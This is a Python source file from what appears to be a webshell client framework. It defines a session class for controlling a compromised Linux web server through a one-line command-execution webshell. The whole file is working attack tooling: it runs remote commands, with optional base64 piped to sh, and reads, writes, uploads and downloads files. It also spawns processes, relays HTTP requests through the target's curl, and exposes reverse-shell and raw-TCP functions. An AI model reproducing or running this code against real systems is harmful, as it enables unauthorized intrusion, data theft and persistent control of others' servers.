import typing as t
import logging
import base64
import shlex
import asyncio
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    Option,
    OptionGroup,
    HttpResponseDict,
    get_http_client,
)

from ..utils.tools import user_json_loads
from .linux_shell_helper import LinuxShellHelper

logger = logging.getLogger("core.sessions.linux_cmd_oneliner")


class LinuxCmdProcess:
    def __init__(
        self,
        pid: str,
        proc_dir: str,
        submit_fn: t.Callable,
    ):
        self._pid = pid
        self._proc_dir = proc_dir
        self._submit = submit_fn
        self._stdout_offset: int = 0
        self._stderr_offset: int = 0

    @property
    def pid(self) -> t.Union[int, str]:
        return self._pid

    async def send_signal(self, sig: int) -> None:
        pid_q = shlex.quote(str(self._pid))
        await self._submit(
            f"kill -{sig} {pid_q} 2>/dev/null; "
            f"pkill -{sig} -P {pid_q} 2>/dev/null; true"
        )

    async def write_stdin(self, data: bytes) -> None:
        b64 = base64.b64encode(data).decode()
        stdin_path = shlex.quote(f"{self._proc_dir}/stdin")
        await self._submit(f"printf '%s' {b64} | base64 -d >> {stdin_path}")

    async def read_stdout_stderr(self) -> t.Tuple[bytes, bytes]:
        stdout_path = shlex.quote(f"{self._proc_dir}/stdout")
        stderr_path = shlex.quote(f"{self._proc_dir}/stderr")

        stdout_data = b""
        out_cmd = (
            f"tail -c +{self._stdout_offset + 1} {stdout_path}"
            " 2>/dev/null | base64 -w0"
        )
        out_b64 = (await self._submit(out_cmd)).strip()
        if out_b64:
            stdout_data = base64.b64decode(out_b64)
            self._stdout_offset += len(stdout_data)

        stderr_data = b""
        err_cmd = (
            f"tail -c +{self._stderr_offset + 1} {stderr_path}"
            " 2>/dev/null | base64 -w0"
        )
        err_b64 = (await self._submit(err_cmd)).strip()
        if err_b64:
            stderr_data = base64.b64decode(err_b64)
            self._stderr_offset += len(stderr_data)

        return stdout_data, stderr_data

    async def wait(self, timeout: float) -> t.Union[int, None]:
        loop = asyncio.get_event_loop()
        deadline = loop.time() + timeout
        rc_path = shlex.quote(f"{self._proc_dir}/rc")

        while True:
            rc_output = (
                await self._submit(f"test -f {rc_path} && cat {rc_path} || echo NONE")
            ).strip()
            if rc_output != "NONE":
                return int(rc_output) if rc_output.isdigit() else -1

            if loop.time() >= deadline:
                return None

            await asyncio.sleep(0.5)


@register_session
class LinuxCmdOneLiner:
    session_type = "LINUX_CMD_ONELINER"
    readable_name = "Linux命令执行"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                Option(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="cmd",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password_method",
                    name="密码传参方式",
                    type="select",
                    placeholder="POST",
                    default_value="POST",
                    alternatives=[
                        {"name": "POST", "value": "POST"},
                        {"name": "GET", "value": "GET"},
                        {"name": "Header", "value": "Header"},
                    ],
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                Option(
                    id="encoder",
                    name="命令编码器",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64_quote", "value": "base64_quote"},
                        {"name": "base64_ifs", "value": "base64_ifs"},
                    ],
                ),
                Option(
                    id="decoder",
                    name="解码器",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64", "value": "base64"},
                    ],
                ),
                Option(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="updownload_chunk_size",
                    name="文件上传下载分块大小",
                    type="text",
                    placeholder="文件上传下载的分块大小，单位为字节，建议在1KB-1024KB之间",
                    default_value="1024",
                    alternatives=None,
                ),
                Option(
                    id="updownload_max_coroutine",
                    name="文件上传下载并发量",
                    type="text",
                    placeholder="控制文件上传和下载时的最大协程数量",
                    default_value="4",
                    alternatives=None,
                ),
                Option(
                    id="extra_post_params",
                    name="额外的POST参数",
                    type="text",
                    placeholder='{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                Option(
                    id="extra_headers",
                    name="额外的headers",
                    type="text",
                    placeholder='{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.password_method = session_conn.get("password_method", "POST").upper()
        self.https_verify = session_conn.get("https_verify", False)

        self.params = user_json_loads(session_conn.get("extra_get_params", "{}"), dict)
        self.data = user_json_loads(session_conn.get("extra_post_params", "{}"), dict)
        self.headers = user_json_loads(
            session_conn.get("extra_headers", "null"), (dict, type(None))
        )

        self.client = get_http_client(verify=self.https_verify)

        self._shell = LinuxShellHelper(
            transport_fn=self._transport,
            encoder=session_conn.get("encoder", "raw"),
            decoder=session_conn.get("decoder", "raw"),
            chunk_size=int(session_conn.get("updownload_chunk_size", 1024)),
            max_coro=int(session_conn.get("updownload_max_coroutine", 4)),
        )

    async def _transport(self, code: str) -> str:
        status_code, html = await self.submit_http(code)
        if status_code == 404:
            raise exceptions.TargetUnreachable(
                f"状态码404, 没有这个webshell: {status_code}"
            )
        return html

    async def execute_cmd(self, cmd: str):
        return await self._shell.execute_cmd(cmd)

    async def test_usablility(self):
        return await self._shell.test_usablility()

    async def get_pwd(self):
        return await self._shell.get_pwd()

    async def list_dir(self, dir_path: str):
        return await self._shell.list_dir(dir_path)

    async def mkdir(self, dir_path: str):
        return await self._shell.mkdir(dir_path)

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200):
        return await self._shell.get_file_contents(filepath, max_size)

    async def put_file_contents(self, filepath: str, content: bytes):
        return await self._shell.put_file_contents(filepath, content)

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        return await self._shell.modify_file(
            filepath, old_str, new_str, replace_strategy
        )

    async def delete_file(self, filepath: str):
        return await self._shell.delete_file(filepath)

    async def move_file(self, filepath: str, new_filepath: str):
        return await self._shell.move_file(filepath, new_filepath)

    async def copy_file(self, filepath: str, new_filepath: str):
        return await self._shell.copy_file(filepath, new_filepath)

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        return await self._shell.upload_file(filepath, content, callback)

    async def download_file(self, filepath: str, callback=None):
        return await self._shell.download_file(filepath, callback)

    async def open_reverse_shell(self, host: str, port: int) -> None:
        return await self._shell.open_reverse_shell(host, port)

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        return await self._shell.send_bytes_over_tcp(host, port, content, send_method)

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return await self._shell.get_send_tcp_support_methods()

    async def get_basicinfo(self):
        return await self._shell.get_basicinfo()

    async def create_process(
        self,
        argv: t.List[str],
        overrides_env: t.Union[t.Dict[str, str], None] = None,
    ) -> LinuxCmdProcess:
        from .linux_shell_helper import shell_command

        proc_dir = (await self._shell.submit("mktemp -d")).strip()
        await self._shell.submit(f"mkfifo {shlex.quote(proc_dir + '/stdin')}")

        env_prefix = ""
        if overrides_env:
            env_parts = ["env"] + [
                f"{shlex.quote(k)}={shlex.quote(v)}" for k, v in overrides_env.items()
            ]
            env_prefix = " ".join(env_parts) + " "

        cmd = shell_command(argv)
        stdin_path = shlex.quote(f"{proc_dir}/stdin")
        stdout_path = shlex.quote(f"{proc_dir}/stdout")
        stderr_path = shlex.quote(f"{proc_dir}/stderr")
        rc_path = shlex.quote(f"{proc_dir}/rc")

        setup_cmd = (
            f"(exec 0<>{stdin_path}; exec 1>{stdout_path}; "
            f"exec 2>{stderr_path}; {env_prefix}{cmd}; "
            f"echo $? > {rc_path}) & echo $!"
        )

        output = (await self._shell.submit(setup_cmd)).strip()
        pid = output.strip()

        return LinuxCmdProcess(pid=pid, proc_dir=proc_dir, submit_fn=self._shell.submit)

    async def send_http_request(
        self,
        url: str,
        method: str = "GET",
        headers: t.Optional[t.Dict[str, str]] = None,
        params: t.Optional[t.Dict[str, t.Any]] = None,
        data: t.Optional[t.Union[str, bytes]] = None,
    ) -> HttpResponseDict:
        from urllib.parse import urlencode
        from .linux_shell_helper import shell_command

        curl_check = await self._shell.submit("which curl")
        if not curl_check.strip():
            raise exceptions.TargetError("目标系统未安装curl命令")

        cmd_parts = ["curl", "-s", "-i"]
        cmd_parts.extend(["-X", method])

        if headers:
            for key, value in headers.items():
                cmd_parts.extend(["-H", f"{key}: {value}"])

        full_url = url
        if params:
            full_url = f"{url}?{urlencode(params)}"

        if data is not None:
            if isinstance(data, bytes):
                data_str = base64.b64encode(data).decode()
                cmd_parts.extend(["--data", data_str])
            else:
                cmd_parts.extend(["--data", data])

        cmd_parts.append(full_url)
        cmd_str = " ".join(shlex.quote(part) for part in cmd_parts)
        output = await self._shell.submit(cmd_str)

        lines = output.splitlines()
        if not lines:
            raise exceptions.NetworkError("HTTP请求无响应")

        status_line = lines[0]
        if not status_line.startswith("HTTP/"):
            raise exceptions.NetworkError(f"无效的HTTP响应: {status_line}")
        status_parts = status_line.split()
        if len(status_parts) < 2:
            raise exceptions.NetworkError(f"无法解析状态码: {status_line}")
        status_code = int(status_parts[1])

        headers_dict: t.Dict[str, str] = {}
        body_lines: t.List[str] = []
        in_body = False
        for line in lines[1:]:
            if not in_body:
                if line.strip() == "":
                    in_body = True
                    continue
                if ":" in line:
                    key, value = line.split(":", 1)
                    headers_dict[key.strip()] = value.strip()
            else:
                body_lines.append(line)

        body = "\n".join(body_lines)
        return HttpResponseDict(
            status_code=status_code,
            headers=headers_dict,
            body=body.encode() if body else b"",
        )

    async def submit_http(self, payload: t.Union[str, bytes]):
        try:
            kwargs = {
                "params": self.params.copy(),
                "headers": {"Connection": "close"},
                "data": self.data.copy(),
            }
            if self.password_method in ["GET", "HEAD"]:
                kwargs["params"][self.password] = payload
            elif self.password_method == "HEADER":
                kwargs["headers"][
                    self.password
                ] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
            else:
                kwargs["data"][self.password] = payload
            response = await self.client.request(
                method=(
                    "POST" if self.password_method == "HEADER" else self.password_method
                ),
                url=self.url,
                **kwargs,
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc
